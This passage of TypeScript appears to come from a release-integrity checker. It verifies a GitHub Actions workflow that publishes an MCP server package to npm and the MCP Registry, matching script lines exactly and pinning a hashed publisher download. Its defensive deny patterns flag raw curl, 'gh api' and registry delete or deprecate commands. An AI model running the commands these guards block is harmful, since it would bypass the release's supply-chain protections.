    '    --arg exactStatus "$exact_status" --arg exactType "$exact_type" --rawfile exactBody "$exact_body" \\\n' +
    '    --arg latestUrl "$REGISTRY_LATEST_URL" --argjson latestExit "$latest_exit" \\\n' +
    '    --arg latestStatus "$latest_status" --arg latestType "$latest_type" --rawfile latestBody "$latest_body"';
  const registryPayloadObject =
    "{expected:{server:$server,package:{name:$package,version:$version,mcpName:$mcpName}},\n" +
    "     exact:{requestUrl:$exactUrl,curlExit:$exactExit,httpStatus:$exactStatus,contentType:$exactType,body:$exactBody},\n" +
    "     latest:{requestUrl:$latestUrl,curlExit:$latestExit,httpStatus:$latestStatus,contentType:$latestType,body:$latestBody}}";
  const publisherCommandLines = run
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => /^"\$MCP_PUBLISHER_BIN"\s+/u.test(line));
  const publisherCommandsAreExact =
    JSON.stringify(publisherCommandLines) ===
    JSON.stringify([
      '"$MCP_PUBLISHER_BIN" validate "$SERVER_JSON_SNAPSHOT"',
      '"$MCP_PUBLISHER_BIN" login github-oidc --registry=https://registry.modelcontextprotocol.io',
      '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"'
    ]);
  const publisherIdentityLines = run
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => line.includes("MCP_PUBLISHER_BIN"));
  const publisherIdentityInventoryIsExact =
    JSON.stringify(publisherIdentityLines) ===
    JSON.stringify([
      'MCP_PUBLISHER_BIN="$PUBLISHER_ROOT/mcp-publisher"',
      'if [ ! -f "$MCP_PUBLISHER_BIN" ] || [ -L "$MCP_PUBLISHER_BIN" ]; then',
      '/bin/chmod 0500 "$MCP_PUBLISHER_BIN"',
      '"$MCP_PUBLISHER_BIN" validate "$SERVER_JSON_SNAPSHOT"',
      '"$MCP_PUBLISHER_BIN" login github-oidc --registry=https://registry.modelcontextprotocol.io',
      '"$MCP_PUBLISHER_BIN" publish "$SERVER_JSON_SNAPSHOT"'
    ]);
  const ghIdentityLines = run
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => line.includes("GH_BIN"));
  const ghIdentityInventoryIsExact =
    JSON.stringify(ghIdentityLines) ===
    JSON.stringify(["GH_BIN=$(type -P gh)", `"$TIMEOUT_BIN" --kill-after=5s "\${limit}s" "$GH_BIN" "$@"`]);
  const logicalRunLines = logicalShellLines(run);
  const curlLogicalInventoryIsExact =
    JSON.stringify(canonicalLogicalShellIdentifierInventory(run, "CURL_BIN")) ===
    JSON.stringify(MCP_REGISTRY_CURL_LOGICAL_INVENTORY);
  const nodeLogicalInventoryIsExact =
    JSON.stringify(canonicalLogicalShellIdentifierInventory(run, "NODE_BIN")) ===
    JSON.stringify(MCP_REGISTRY_NODE_LOGICAL_INVENTORY);
  const ansiCQuotes = ansiCQuoteInventory(run);
  const ansiCQuoteInventoryIsExact =
    JSON.stringify(ansiCQuotes) === JSON.stringify([MCP_REGISTRY_HTTP_WRITE_OUT_ANSI_C]);
  const rawCurlTokenLines = logicalRunLines.filter((line) => /\bcurl\b/u.test(conservativeShellLexicalLine(line)));
  const rawGhTokenLines = logicalRunLines.filter((line) => /\bgh\b/u.test(conservativeShellLexicalLine(line)));
  const rawNetworkToolInventoryIsExact =
    JSON.stringify(rawCurlTokenLines) === JSON.stringify(["CURL_BIN=$(type -P curl)"]) &&
    JSON.stringify(rawLogicalNodeTokenInventory(run)) === JSON.stringify(MCP_REGISTRY_RAW_NODE_LOGICAL_INVENTORY) &&
    JSON.stringify(rawGhTokenLines) ===
      JSON.stringify([
        "GH_BIN=$(type -P gh)",
        'GH_CONFIG_DIR="$WORK_ROOT/gh-config"',
        'echo "::error::gh_read accepts read-only gh api calls" >&2',
        'echo "::error::gh_read rejects mutation-capable gh api arguments" >&2'
      ]);
  const controlLoopLines = run
    .split("\n")
    .map((line) => line.trim())
    .filter((line) => /^(?:for|while|until)\b/u.test(line));
  const controlLoopInventoryIsExact =
    JSON.stringify(controlLoopLines) ===
    JSON.stringify([
      "for MANIFEST in package.json server.json; do",
      'for argument in "$@"; do',
      "for attempt in {1..12}; do"
    ]);
  const firstReuseBlock =
    'if [ "$PREFLIGHT_ACTION" = "reuse" ]; then\n' +
    "  assert_remote_tag_identity\n" +
    '  echo "MCP Registry already exposes exact active/latest $MCP_NAME@$VERSION"\n' +
    "  exit 0\n" +
    "fi";
  const secondReuseBlock =
    'if [ "$SECOND_ACTION" = "reuse" ]; then\n' +
    "  assert_remote_tag_identity\n" +
    '  echo "MCP Registry converged before the sole publish boundary"\n' +
    "  exit 0\n" +
    "fi";
  const confirmedBlock =
    'if [ "$CONVERGENCE_ACTION" = "confirmed" ]; then\n' + "    MCP_REGISTRY_CONFIRMED=true\n" + "    break\n" + "  fi";
  const firstDecisionBlock =
    "PREFLIGHT_RESULT=$(registry_snapshot preflight)\n" +
    'PREFLIGHT_ACTION=$(registry_action "$PREFLIGHT_RESULT" publish reuse)\n' +
    firstReuseBlock;
  const secondDecisionBlock =
    "SECOND_RESULT=$(registry_snapshot preflight)\n" +
    'SECOND_ACTION=$(registry_action "$SECOND_RESULT" publish reuse)\n' +
    secondReuseBlock;
  const convergenceDecisionBlock =
    "CONVERGENCE_RESULT=$(registry_snapshot convergence)\n" +
    '  CONVERGENCE_ACTION=$(registry_action "$CONVERGENCE_RESULT" confirmed retry)\n' +
    `  ${confirmedBlock}`;
  const manifestSnapshotBody =
    "assert_manifest_snapshots() {\n" +
    "  local package_digest server_digest\n" +
    '  if [ ! -f "$PACKAGE_JSON_SNAPSHOT" ] || [ -L "$PACKAGE_JSON_SNAPSHOT" ] ||\n' +
    '     [ ! -f "$SERVER_JSON_SNAPSHOT" ] || [ -L "$SERVER_JSON_SNAPSHOT" ]; then\n' +
    '    echo "::error::Registry manifest snapshot type changed" >&2\n' +
    "    exit 1\n" +
    "  fi\n" +
    '  package_digest=$(/usr/bin/sha256sum "$PACKAGE_JSON_SNAPSHOT")\n' +
    `  package_digest=\${package_digest%% *}\n` +
    '  server_digest=$(/usr/bin/sha256sum "$SERVER_JSON_SNAPSHOT")\n' +
    `  server_digest=\${server_digest%% *}\n` +
    '  if [ "$package_digest" != "$PACKAGE_JSON_SHA256" ] || [ "$server_digest" != "$SERVER_JSON_SHA256" ]; then\n' +
    '    echo "::error::Registry manifest snapshot bytes changed" >&2\n' +
    "    exit 1\n" +
    "  fi\n" +
    "}";
  const containsForbiddenRegistryWriteArguments = hasForbiddenRegistryWriteArguments(run);
  const hasForbiddenPublisherMutation = run
    .split("\n")
    .some((line) => /(?:^|\/)mcp-publisher"?\s+(?:publish|delete|deprecate|undeprecate|status)\b/iu.test(line.trim()));
  const hasDirectRegistryGhApiCommand = run
    .split("\n")
    .some((line) => /^(?:(?:env|\/usr\/bin\/env)\s+)?(?:gh|\/usr\/bin\/gh|"\$GH_BIN")\s+api\b/u.test(line.trim()));
  const hasDirectRawCurlCommand = run
    .split("\n")
    .some((line) => /^(?:(?:env|\/usr\/bin\/env)\s+)?(?:curl|\/usr\/bin\/curl)\b/u.test(line.trim()));
  const hasManifestSnapshotRedirection =
    /(?:>|>>)[ \t]*"\$(?:PACKAGE_JSON_SNAPSHOT|SERVER_JSON_SNAPSHOT|SNAPSHOT)"/u.test(run);
  const httpFunctionIndex = run.indexOf("registry_http_read() {");
  const httpBodyResetIndex = run.indexOf(': > "$body_file"', httpFunctionIndex);
  const httpSetPlusIndex = run.indexOf("set +e", httpBodyResetIndex);
  const httpResponseIndex = run.indexOf("response=$(deadline_timeout 35 10", httpSetPlusIndex);
  const httpOutputIndex = run.indexOf('--output "$body_file"', httpResponseIndex);
  const httpWriteOutIndex = run.indexOf(`--write-out ${MCP_REGISTRY_HTTP_WRITE_OUT_ANSI_C}`, httpOutputIndex);
  const httpExitCaptureIndex = run.indexOf("request_exit=$?", httpWriteOutIndex);
  const httpSetMinusIndex = run.indexOf("set -e", httpExitCaptureIndex);
  const httpCurlExitIndex = run.indexOf('REGISTRY_CURL_EXIT="$request_exit"', httpSetMinusIndex);
  const httpStatusIndex = run.indexOf("REGISTRY_HTTP_STATUS=$(printf", httpCurlExitIndex);
  const httpTypeIndex = run.indexOf("REGISTRY_CONTENT_TYPE=$(printf", httpStatusIndex);
  const snapshotFunctionIndex = run.indexOf("registry_snapshot() {", httpTypeIndex);
  const snapshotGuardIndex = run.indexOf("assert_manifest_snapshots", snapshotFunctionIndex);
  const snapshotExactReadIndex = run.indexOf(
    'registry_http_read "$REGISTRY_EXACT_URL" "$exact_body"',
    snapshotGuardIndex
  );
  const exactExitBindingIndex = run.indexOf('exact_exit="$REGISTRY_CURL_EXIT"', snapshotExactReadIndex);
  const exactStatusBindingIndex = run.indexOf('exact_status="$REGISTRY_HTTP_STATUS"', exactExitBindingIndex);
  const exactTypeBindingIndex = run.indexOf('exact_type="$REGISTRY_CONTENT_TYPE"', exactStatusBindingIndex);
  const snapshotLatestReadIndex = run.indexOf(
    'registry_http_read "$REGISTRY_LATEST_URL" "$latest_body"',
    exactTypeBindingIndex
  );
  const latestExitBindingIndex = run.indexOf('latest_exit="$REGISTRY_CURL_EXIT"', snapshotLatestReadIndex);
  const latestStatusBindingIndex = run.indexOf('latest_status="$REGISTRY_HTTP_STATUS"', latestExitBindingIndex);
  const latestTypeBindingIndex = run.indexOf('latest_type="$REGISTRY_CONTENT_TYPE"', latestStatusBindingIndex);
  const snapshotPayloadIndex = run.indexOf("payload=$($JQ_BIN -cn", latestTypeBindingIndex);
  const exactRawfileIndex = run.indexOf('--rawfile exactBody "$exact_body"', snapshotPayloadIndex);
  const latestRawfileIndex = run.indexOf('--rawfile latestBody "$latest_body"', exactRawfileIndex);
  const evaluatorInvocationIndex = run.indexOf(evaluatorInvocation, latestRawfileIndex);
  const validationSnapshotIndex = run.lastIndexOf("assert_manifest_snapshots", validationIndex);
  const publisherDownloadIndex = run.indexOf('deadline_timeout 70 10 "MCP publisher download"', preparationIndex);
  const publisherSizeIndex = run.indexOf(
    '[ "$(/usr/bin/stat -c \'%s\' "$MCP_PUBLISHER_ARCHIVE")" != "$MCP_PUBLISHER_SIZE" ]',
    publisherDownloadIndex
  );
  const publisherHashIndex = run.indexOf("/usr/bin/sha256sum -c -", publisherSizeIndex);
  const publisherInventoryIndex = run.indexOf(
    'PUBLISHER_ENTRIES=$(deadline_timeout 30 10 "MCP publisher inventory"',
    publisherHashIndex
  );
  const publisherExtractionIndex = run.indexOf(
    'deadline_timeout 30 10 "MCP publisher extraction"',
    publisherInventoryIndex
  );
  const publishExitInitIndex = run.indexOf("MCP_PUBLISH_EXIT=0", prewriteTagIndex);
  const publishSetPlusIndex = run.indexOf("set +e", publishExitInitIndex);
  const publishExitCaptureIndex = run.indexOf("MCP_PUBLISH_EXIT=$?", publishIndex);
  const publishSetMinusIndex = run.indexOf("set -e", publishExitCaptureIndex);
  const workflowIsExact =
    step?.name === MCP_REGISTRY_STEP_NAME &&
    step?.if === "steps.dist_tag.outputs.tag == 'latest'" &&
    step?.shell === "/bin/bash --noprofile --norc -p -e -o pipefail {0}" &&
    envIsExact &&
    run.length > 0 &&
    run.length <= GITHUB_RUN_CHARACTER_LIMIT &&
    run.startsWith(`set -euo pipefail\n${LOWERCASE_PROXY_UNSET}\nbuiltin umask 077\n`) &&
    run.includes('! [[ "$VERSION" =~ ^(0|[1-9][0-9]*)\\.(0|[1-9][0-9]*)\\.(0|[1-9][0-9]*)$ ]]') &&
    run.includes('[ "$TAG" != "v$VERSION" ] || [ "$NPM_PROVENANCE_VERIFIED" != "true" ]') &&
    mutationMatchCount(run, MCP_REGISTRY_WORK_ROOT_INIT) === 1 &&
    run.includes('GH_CONFIG_DIR="$WORK_ROOT/gh-config"') &&
    run.includes('/bin/mkdir -m 0700 "$MCP_REGISTRY_HOME" "$PUBLISHER_ROOT" "$GH_CONFIG_DIR"') &&
    run.includes('EVALUATOR="$GITHUB_WORKSPACE/scripts/check-release-integrity.mjs"') &&
    run.includes("GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_SYSTEM=/dev/null") &&
    run.includes("GIT_CONFIG_GLOBAL=/dev/null GIT_CONFIG_COUNT=0 GIT_NO_LAZY_FETCH=1") &&
    run.includes('if [ "$(registry_git rev-parse HEAD)" != "$SOURCE_SHA" ] ||') &&
    mutationMatchCount(run, 'registry_git diff --quiet "$SOURCE_SHA" -- package.json server.json') === 2 &&
    run.includes(
      'if [ "$(registry_git rev-parse "$SOURCE_SHA:$MANIFEST")" != "$(registry_git hash-object "$SNAPSHOT")" ]; then'
    ) &&
    run.includes('PACKAGE_JSON_SHA256=$(/usr/bin/sha256sum "$PACKAGE_JSON_SNAPSHOT")') &&
    run.includes('SERVER_JSON_SHA256=$(/usr/bin/sha256sum "$SERVER_JSON_SNAPSHOT")') &&
    mutationMatchCount(run, manifestSnapshotBody) === 1 &&
    run.includes('PACKAGE_NAME=$($JQ_BIN -er \'.name | select(type == "string")\' "$PACKAGE_JSON_SNAPSHOT")') &&
    run.includes("EXPECTED_SERVER_JSON=$($JQ_BIN -ce '.' \"$SERVER_JSON_SNAPSHOT\")") &&
    run.includes('[ "$PACKAGE_NAME" != "@oomkapwn/enquire-mcp" ]') &&
    run.includes('[ "$MCP_NAME" != "io.github.oomkapwn/enquire-mcp" ]') &&
    mutationMatchCount(run, NPM_RESERVE_DEADLINE_GUARD) === 1 &&
    mutationMatchCount(run, GH_READ_DEADLINE_GUARD) === 1 &&
    mutationMatchCount(run, `"$TIMEOUT_BIN" --kill-after=5s "\${cap}s" "$@"`) === 1 &&
    mutationMatchCount(run, "registry_git() {") === 1 &&
    mutationMatchCount(run, "require_job_reserve() {") === 1 &&
    mutationMatchCount(run, "deadline_timeout() {") === 1 &&
    mutationMatchCount(run, "gh_read() {") === 1 &&
    mutationMatchCount(run, "assert_manifest_snapshots() {") === 1 &&
    mutationMatchCount(run, "registry_http_read() {") === 1 &&
    mutationMatchCount(run, "registry_snapshot() {") === 1 &&
    mutationMatchCount(run, "registry_action() {") === 1 &&
    mutationMatchCount(run, "registry_action") === 4 &&
    mutationMatchCount(run, "registry_snapshot") === 4 &&
    mutationMatchCount(run, "registry_http_read") === 3 &&
    mutationMatchCount(run, "assert_manifest_snapshots") === 4 &&
    mutationMatchCount(run, "registry_git") === 6 &&
    mutationMatchCount(run, "require_job_reserve") === 5 &&
    mutationMatchCount(run, "deadline_timeout") === 10 &&
    mutationMatchCount(run, "gh_read") === 6 &&
    mutationMatchCount(run, "MCP_PUBLISHER_BIN") === 7 &&
    mutationMatchCount(run, "GH_BIN") === 2 &&
    mutationMatchCount(run, "CURL_BIN") === 3 &&
    mutationMatchCount(run, "PACKAGE_JSON_SNAPSHOT") === 8 &&
    mutationMatchCount(run, "SERVER_JSON_SNAPSHOT") === 9 &&
    mutationMatchCount(run, "EXPECTED_SERVER_JSON") === 2 &&
    mutationMatchCount(run, "PACKAGE_JSON_SHA256") === 4 &&
    mutationMatchCount(run, "SERVER_JSON_SHA256") === 4 &&
    mutationMatchCount(run, '"$SNAPSHOT"') === 3 &&
    reserveCompositionIsExact &&
    mutationMatchCount(run, "assert_remote_tag_identity() {") === 1 &&
    tagProofCalls === 5 &&
    mutationMatchCount(run, "assert_remote_tag_identity") === 6 &&
    mutationMatchCount(run, "?include_deleted=true") === 2 &&
    run.includes(
      `REGISTRY_EXACT_URL="https://registry.modelcontextprotocol.io/v0.1/servers/\${SERVER_NAME_ENCODED}/versions/\${VERSION_ENCODED}?include_deleted=true"`
    ) &&
    run.includes(
      `REGISTRY_LATEST_URL="https://registry.modelcontextprotocol.io/v0.1/servers/\${SERVER_NAME_ENCODED}/versions/latest?include_deleted=true"`
    ) &&
    run.includes('deadline_timeout 35 10 "MCP Registry read" "$CURL_BIN" --disable') &&
    run.includes("--max-filesize 1048576 --retry 0 --proto '=https' --tlsv1.2") &&
    run.includes("--header 'Accept: application/json, application/problem+json'") &&
    run.includes('registry_http_read "$REGISTRY_EXACT_URL" "$exact_body"') &&
    run.includes('registry_http_read "$REGISTRY_LATEST_URL" "$latest_body"') &&
    mutationMatchCount(run, evaluatorInvocation) === 1 &&
    mutationMatchCount(run, registryPayloadBindings) === 1 &&
    mutationMatchCount(run, registryPayloadObject) === 1 &&
    mutationMatchCount(run, "registry_snapshot preflight") === 2 &&
    mutationMatchCount(run, "registry_snapshot convergence") === 1 &&
    mutationMatchCount(run, registryActionBody) === 1 &&
    mutationMatchCount(run, "PREFLIGHT_ACTION=") === 1 &&
    mutationMatchCount(run, "SECOND_ACTION=") === 1 &&
    mutationMatchCount(run, "CONVERGENCE_ACTION=") === 1 &&
    mutationMatchCount(run, firstDecisionBlock) === 1 &&
    mutationMatchCount(run, secondDecisionBlock) === 1 &&
    mutationMatchCount(run, convergenceDecisionBlock) === 1 &&
    controlLoopInventoryIsExact &&
    run.includes('MCP_PUBLISHER_TAG="v1.7.9"') &&
    run.includes('MCP_PUBLISHER_SHA256="ab128162b0616090b47cf245afe0a23f3ef08936fdce19074f5ba0a4469281ac"') &&
    run.includes('MCP_PUBLISHER_SIZE="7297012"') &&
    run.includes(
      `MCP_PUBLISHER_URL="https://github.com/modelcontextprotocol/registry/releases/download/\${MCP_PUBLISHER_TAG}/mcp-publisher_linux_amd64.tar.gz"`
    ) &&
    run.includes('deadline_timeout 70 10 "MCP publisher download" "$CURL_BIN" --disable --fail') &&
    run.includes('--max-filesize "$MCP_PUBLISHER_SIZE" --retry 0 --location --max-redirs 1') &&
    run.includes('printf \'%s  %s\\n\' "$MCP_PUBLISHER_SHA256" "$MCP_PUBLISHER_ARCHIVE" | /usr/bin/sha256sum -c -') &&
    run.includes('PUBLISHER_ENTRIES=$(deadline_timeout 30 10 "MCP publisher inventory" "$TAR_BIN" -tzf') &&
    run.includes('if [ "$PUBLISHER_ENTRIES" != "mcp-publisher" ]; then') &&
    run.includes('--no-same-owner --no-same-permissions -C "$PUBLISHER_ROOT" -- mcp-publisher') &&
    run.includes('/bin/chmod 0500 "$MCP_PUBLISHER_BIN"') &&
    mutationMatchCount(run, validationInvocation) === 1 &&
    mutationMatchCount(run, loginInvocation) === 1 &&
    mutationMatchCount(run, publishInvocation) === 1 &&
    publisherCommandsAreExact &&
    publisherIdentityInventoryIsExact &&
    ghIdentityInventoryIsExact &&
    curlLogicalInventoryIsExact &&
    nodeLogicalInventoryIsExact &&
    ansiCQuoteInventoryIsExact &&
    rawNetworkToolInventoryIsExact &&
    !containsExactEmptyEnvironmentReference &&
    !containsForbiddenRegistryWriteArguments &&
    !hasForbiddenPublisherMutation &&
    !hasDirectRegistryGhApiCommand &&
    !hasDirectRawCurlCommand &&
    !hasManifestSnapshotRedirection &&
    run.includes('TOKEN_FILE="$MCP_REGISTRY_HOME/.config/mcp-publisher/token.json"') &&
    run.includes('type == "object" and keys == ["method","registry","token"]') &&
    run.includes('.method == "github-oidc" and .registry == "https://registry.modelcontextprotocol.io" and') &&
    run.includes('(.token | type) == "string" and (.token | length) > 0') &&
    run.includes('\' "$TOKEN_FILE" >/dev/null; then') &&
    publishCalls === 1 &&
    mutationMatchCount(run, "MCP_PUBLISH_ATTEMPTED=true") === 1 &&
    run.includes(
      "assert_manifest_snapshots\nassert_remote_tag_identity\nMCP_PUBLISH_ATTEMPTED=true\nMCP_PUBLISH_EXIT=0\nset +e"
    ) &&
    initialTagIndex >= 0 &&
    firstReuseTagIndex > initialTagIndex &&
    preparationIndex > firstReuseTagIndex &&
    validationIndex > preparationIndex &&
    validationSnapshotIndex > preparationIndex &&
    validationSnapshotIndex < validationIndex &&
    loginIndex > validationIndex &&
    secondPreflightIndex > loginIndex &&
    secondReuseTagIndex > secondPreflightIndex &&
    prewriteReserveIndex > secondReuseTagIndex &&
    prewriteSnapshotIndex > prewriteReserveIndex &&
    prewriteTagIndex > prewriteSnapshotIndex &&
    publishIndex > prewriteTagIndex &&
    publishExitInitIndex > prewriteTagIndex &&
    publishSetPlusIndex > publishExitInitIndex &&
    publishIndex > publishSetPlusIndex &&
    publishExitCaptureIndex > publishIndex &&
    publishSetMinusIndex > publishExitCaptureIndex &&
    convergenceIndex > publishIndex &&
    convergenceIndex > publishSetMinusIndex &&
    confirmationIndex > convergenceIndex &&
    finalTagIndex > confirmationIndex &&
    httpFunctionIndex >= 0 &&
    httpBodyResetIndex > httpFunctionIndex &&
    httpSetPlusIndex > httpBodyResetIndex &&
    httpResponseIndex > httpSetPlusIndex &&
    httpOutputIndex > httpResponseIndex &&
    httpWriteOutIndex > httpOutputIndex &&
    httpExitCaptureIndex > httpWriteOutIndex &&
    httpSetMinusIndex > httpExitCaptureIndex &&
    httpCurlExitIndex > httpSetMinusIndex &&
    httpStatusIndex > httpCurlExitIndex &&
    httpTypeIndex > httpStatusIndex &&
    snapshotFunctionIndex > httpTypeIndex &&
    snapshotGuardIndex > snapshotFunctionIndex &&
    snapshotExactReadIndex > snapshotGuardIndex &&
    exactExitBindingIndex > snapshotExactReadIndex &&
    exactStatusBindingIndex > exactExitBindingIndex &&
    exactTypeBindingIndex > exactStatusBindingIndex &&
    snapshotLatestReadIndex > exactTypeBindingIndex &&
    latestExitBindingIndex > snapshotLatestReadIndex &&
    latestStatusBindingIndex > latestExitBindingIndex &&
    latestTypeBindingIndex > latestStatusBindingIndex &&
    snapshotPayloadIndex > latestTypeBindingIndex &&
    exactRawfileIndex > snapshotPayloadIndex &&
    latestRawfileIndex > exactRawfileIndex &&
    evaluatorInvocationIndex > latestRawfileIndex &&
    (run.match(/^[ \t]*assert_manifest_snapshots[ \t]*$/gmu) ?? []).length === 3 &&
    publisherDownloadIndex > preparationIndex &&
    publisherSizeIndex > publisherDownloadIndex &&
    publisherHashIndex > publisherSizeIndex &&
    publisherInventoryIndex > publisherHashIndex &&
    publisherExtractionIndex > publisherInventoryIndex &&
    mutationMatchCount(run.slice(convergenceIndex), '"$MCP_PUBLISHER_BIN" publish') === 0 &&
    run.includes('CONVERGENCE_ACTION=$(registry_action "$CONVERGENCE_RESULT" confirmed retry)') &&
    run.includes('if [ "$attempt" -lt 12 ]; then') &&
    run.includes('deadline_timeout 11 10 "MCP Registry convergence wait" /bin/sleep 10') &&
    mutationMatchCount(run, "MCP_REGISTRY_CONFIRMED=false") === 1 &&
    mutationMatchCount(run, "MCP_REGISTRY_CONFIRMED=true") === 1 &&
    mutationMatchCount(run, confirmedBlock) === 1 &&
    !run.includes("node -e") &&
    !run.includes('"$NODE_BIN" -e') &&
    !/(?:^|[ \t])(?:delete|deprecate|undeprecate)(?:[ \t]|$)/mu.test(run) &&
    mcpRegistryEvaluatorProblems(integrity).length === 0;
  return workflowIsExact ? [] : [MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM];
}

function mcpRegistryContractProblems(steps: YamlRecord[], integrity: string, permissions: YamlRecord): string[] {
  const registryIndices = steps
    .map((step, index) => (step.name === MCP_REGISTRY_STEP_NAME ? index : -1))
    .filter((index) => index >= 0);
  const uploadIndex = steps.findIndex((step) => step.name === "Upload Basic MCPB asset, checksum, and provenance");
  const registryIndex = registryIndices[0] ?? -1;
  if (
    permissions["id-token"] !== "write" ||
    registryIndices.length !== 1 ||
    uploadIndex < 0 ||
    registryIndex !== uploadIndex + 1 ||
    registryIndex !== steps.length - 1
  ) {
    return [MCP_REGISTRY_WORKFLOW_CONTRACT_PROBLEM];
  }
  return mcpRegistryStepProblems(steps[registryIndex], integrity);
}

function npmProvenanceContractProblems(release: string, integrity: string): string[] {
  const workflowProblems = npmProvenanceWorkflowProblems(release);
  if (workflowProblems.length !== 0) return workflowProblems;
  return npmProvenanceEvaluatorProblems(integrity);
}

function mcpbContractProblems(inputs: {
  manifest: string;
  cli: string;
  cliHelp: string;
  server: string;
  build: string;
  consumer: string;
  docsApi: string;
  integrity: string;
  packageLock: string;
  packageJson: string;
  release: string;
  releaseTransaction: string;
  versionCheck: string;
  versionSync: string;
}): string[] {
  const problems: string[] = [];
  let manifest: Record<string, unknown>;
  let lock: Record<string, unknown>;
  let pkg: Record<string, unknown>;
  let releaseSteps: Array<Record<string, unknown>>;
  let releasePermissions: YamlRecord;
  let releaseTransactionFixture: string;
  try {
    manifest = JSON.parse(inputs.manifest) as Record<string, unknown>;
    lock = JSON.parse(inputs.packageLock) as Record<string, unknown>;
    pkg = JSON.parse(inputs.packageJson) as Record<string, unknown>;
    const releaseDocument = yamlRecord(load(inputs.release));
    const releaseJob = yamlRecord(yamlRecord(releaseDocument?.jobs)?.publish);
    releaseSteps = yamlSteps(releaseJob ?? {});
    releasePermissions = yamlRecord(releaseDocument?.permissions) ?? {};
    releaseTransactionFixture = releaseTransactionFixtureBody(releaseDocument);
  } catch {
    return ["MCPB manifest/package metadata and release workflow must parse"];
  }
  const server = yamlRecord(manifest.server);
  const config = yamlRecord(server?.mcp_config);
  const compatibility = yamlRecord(manifest.compatibility);
  const runtimes = yamlRecord(compatibility?.runtimes);
  const userConfig = yamlRecord(yamlRecord(manifest.user_config)?.vault);
  const toolNames = Array.isArray(manifest.tools)
    ? manifest.tools
        .map(yamlRecord)
        .map((entry) => entry?.name)
        .filter((name): name is string => typeof name === "string")
        .sort()
    : [];
  const args = Array.isArray(config?.args) ? config.args.filter((arg): arg is string => typeof arg === "string") : [];
  problems.push(...npmProvenanceContractProblems(inputs.release, inputs.integrity));
  problems.push(...mcpRegistryContractProblems(releaseSteps, inputs.integrity, releasePermissions));
  if (
    manifest.manifest_version !== "0.3" ||
    !String(manifest.$schema ?? "").includes("70fe3b34cd6dff1b3bba046638edc72a6467a4fb") ||
    manifest.version !== pkg.version ||
    server?.type !== "node" ||
    server.entry_point !== "server/dist/index.js" ||
    config?.command !== "node" ||
    runtimes?.node !== ">=22.13.0" ||
    JSON.stringify(compatibility?.platforms) !== JSON.stringify(["darwin", "win32", "linux"]) ||
    userConfig?.type !== "directory" ||
    userConfig.required !== true ||
    userConfig.multiple !== false
  ) {
    problems.push("MCPB v0.3 identity, entrypoint, vault permission, or runtime floor drifted");
  }
  const releaseStateSteps = [
    "Download exact CI-gated Basic MCPB release asset",
    "Re-verify exact CI-gated Basic MCPB release asset",
    "Resolve npm dist-tag from version",
    "Prepare deterministic Basic release records",
    "Preflight existing GitHub release and every Basic asset before npm",
    "Publish with provenance or verify an exact prior publication",
    NPM_PROVENANCE_STEP_NAME,
    "Prepare draft GitHub Release",
    "Upload Basic MCPB asset, checksum, and provenance",
    MCP_REGISTRY_STEP_NAME
  ];
  const releaseStateIndices = releaseStateSteps.map((name) => releaseSteps.findIndex((step) => step.name === name));
  if (
    releaseStateIndices.some((index) => index < 0) ||
    releaseStateIndices.some((index, position) => position > 0 && index <= (releaseStateIndices[position - 1] ?? -1))
  ) {
    problems.push(
      "release state machine must preflight all deterministic assets before npm, then draft/upload/publish"
    );
  }
  const npmPublishStep = namedStep(releaseSteps, "Publish with provenance or verify an exact prior publication");
  const npmPublishRun = runBody(npmPublishStep);
  const npmPublishEnv = yamlRecord(npmPublishStep?.env);
  const uploadStep = namedStep(releaseSteps, "Upload Basic MCPB asset, checksum, and provenance");
  const uploadWrapper = runBody(uploadStep);
  const uploadEnv = yamlRecord(uploadStep?.env);
  const expectedReleaseTransactionFixture = normalizedReleaseTransactionFixture(inputs.releaseTransaction);
  const releaseTransactionHasCanonicalLf =
    inputs.releaseTransaction.endsWith("\n") && !inputs.releaseTransaction.endsWith("\n\n");
  const releaseTransactionSnapshot = releaseTransactionHasCanonicalLf ? inputs.releaseTransaction.slice(0, -1) : "";
  const releaseTransactionHash = createHash("sha256").update(releaseTransactionSnapshot, "utf8").digest("hex");
  const releaseTransactionIsPinned =
    releaseTransactionHasCanonicalLf &&
    inputs.releaseTransaction.startsWith(`set -euo pipefail\n${LOWERCASE_PROXY_UNSET}\n`) &&
    !inputs.releaseTransaction.includes("${{") &&
    !inputs.releaseTransaction.includes("GH_TOKEN=") &&
    !inputs.releaseTransaction.includes("GITHUB_ENV") &&
    releaseTransactionFixture === expectedReleaseTransactionFixture &&
    uploadWrapper === releaseTransactionWrapper(releaseTransactionHash) &&
    uploadEnv?.MCPB_RELEASE_REPOSITORY === `\${{ github.repository }}` &&
    uploadEnv?.MCPB_RELEASE_CHANNEL === `\${{ steps.dist_tag.outputs.tag }}` &&
    uploadEnv?.MCPB_RELEASE_WORKFLOW_SHA === `\${{ github.workflow_sha }}` &&
    uploadWrapper.length <= GITHUB_RUN_CHARACTER_LIMIT;
  const npmAssignmentLineCount = (name: string) =>
    npmPublishRun
      .split("\n")
      .map((line) => line.trim())
      .filter((line) => line.startsWith(`${name}=`)).length;
  const npmStateInvocation = 'npm-state "$SOURCE_SHA" "$EXPECTED_INTEGRITY" "$VERSION" "$CHANNEL"';
  const npmEnvPurgePattern =
    "npm_config_registry|npm_config_@oomkapwn:registry|npm_config_proxy|npm_config_https_proxy|" +
    "npm_config_ca|npm_config_cafile|npm_config_strict_ssl|npm_config_fetch_retries|" +
    "npm_config_fetch_timeout|npm_config_userconfig|npm_config_globalconfig";
  const npmReserveIndex = npmPublishRun.indexOf('require_job_reserve 4500 "npm publish"');
  const npmPrewriteTagIndex = npmPublishRun.indexOf("\n  assert_remote_tag_identity", npmReserveIndex);
  const npmPrewriteReadIndex = npmPublishRun.indexOf("if ! registry_read; then", npmPrewriteTagIndex);
  const npmRehashIndex = npmPublishRun.indexOf(
    'PRE_PUBLISH_INTEGRITY=$(tarball_sri "$PACKAGE_TARBALL")',
    npmPrewriteReadIndex
  );
  const npmAttemptedIndex = npmPublishRun.indexOf("NPM_PUBLISH_ATTEMPTED=true", npmRehashIndex);
  const npmPublishCwdIndex = npmPublishRun.indexOf(
    'NPM_PUBLISH_CWD=$(/usr/bin/mktemp -d "$RUNNER_TEMP/enquire-npm-publish.XXXXXX")',
    npmAttemptedIndex
  );
